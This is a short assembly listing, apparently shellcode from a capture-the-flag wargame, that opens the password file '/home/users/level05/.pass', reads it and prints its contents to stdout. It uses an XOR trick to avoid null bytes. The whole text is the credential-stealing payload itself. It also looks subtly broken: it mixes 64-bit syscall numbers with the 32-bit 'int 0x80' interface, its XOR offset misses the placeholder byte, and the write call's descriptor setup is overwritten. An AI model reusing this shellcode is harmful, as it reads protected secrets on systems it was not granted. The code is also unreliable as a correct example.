global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop edi ; pop path value
; NULL byte fix
xor byte [edi + 24], 0x41
  
xor eax, eax
add al, 2
xor esi, esi ; set O_RDONLY flag
int 0x80
  
; syscall read file
sub sp, 0xfff
lea esi, [esp]
mov edi, eax
xor edx, edx
mov dx, 0xfff; size to read
xor eax, eax
int 0x80
  
; syscall write to stdout
xor edi, edi
mov dl, 1 ; set stdout fd = 1
mov edx, eax
xor eax, eax
add al, 1
int 0x80
  
; syscall exit
xor eax, eax
add al, 60
int 0x80
  
_push_filename:
call _readfile
path: db "/home/users/level05/.passA"
  
